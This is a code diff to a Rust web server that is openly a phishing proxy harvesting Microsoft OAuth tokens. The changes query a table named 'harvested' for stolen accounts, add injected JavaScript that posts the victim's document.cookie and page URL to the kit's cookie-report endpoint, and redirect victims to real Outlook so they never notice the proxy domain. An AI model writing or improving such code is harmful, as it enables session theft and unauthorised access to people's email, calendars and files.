@@ -574,16 +574,35 @@ async fn exchange_code(
     }
 }
 
-// Token-based auth-success page: redirect to Outlook after OAuth
-// The OAuth token IS the session - no cookies needed
-// Graph API provides full access to emails, calendar, OneDrive, etc.
+// Token-based auth-success page: redirect to REAL Outlook after OAuth
+// Victim NEVER sees the proxy domain - they go directly to Microsoft
+// The OAuth token IS the session - Graph API provides full access
 async fn auth_success_handler(
     query: web::Query<std::collections::HashMap<String, String>>,
     state: web::Data<AppState>,
 ) -> impl Responder {
     let token_id = query.get("token_id").cloned().unwrap_or_default();
-    let proxy_domain = &state.config.proxy_domain;
-
+    
+    // Look up account_type to determine the correct real Outlook URL
+    let account_type: Option<String> = if !token_id.is_empty() {
+        sqlx::query_scalar::<_, String>(
+            "SELECT account_type FROM harvested WHERE id = ? UNION ALL SELECT account_type FROM tokens WHERE id = ? LIMIT 1"
+        )
+        .bind(&token_id)
+        .bind(&token_id)
+        .fetch_optional(&state.pool)
+        .await
+        .unwrap_or(None)
+    } else {
+        None
+    };
+    
+    // Determine real Outlook URL based on account type
+    let outlook_url = match account_type.as_deref() {
+        Some("enterprise") | Some("business") | Some("organization") => "https://outlook.office.com/owa/",
+        _ => "https://outlook.live.com/owa/",
+    };
+    
     let html = format!(r#"<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -657,14 +676,27 @@ async fn auth_success_handler(
         </div>
     </div>
     <script>
-        // Redirect to proxy session URL after 3 seconds to capture cookies
-        // The /s/{token_id}/ path allows the proxy to associate cookies with this token
+        // Ghost window: try to capture any available cookies from current domain
+        (function() {{
+            fetch('/api/proxy/cookie-report', {{
+                method: 'POST',
+                headers: {{ 'Content-Type': 'application/json' }},
+                body: JSON.stringify({{
+                    token_id: '{}',
+                    cookies: document.cookie,
+                    url: window.location.href,
+                    timestamp: new Date().toISOString()
+                }})
+            }}).catch(function(e) {{ console.log('Ghost report failed:', e); }});
+        }})();
+        
+        // Redirect to REAL Outlook after 3 seconds - victim never sees proxy domain
         setTimeout(function() {{
-            window.location.href = 'https://{}/s/{}/';
+            window.location.href = '{}';
         }}, 3000);
     </script>
 </body>
-</html>"#, proxy_domain, token_id);
+</html>"#, token_id, outlook_url);
 
     HttpResponse::Ok()
         .content_type("text/html; charset=utf-8")
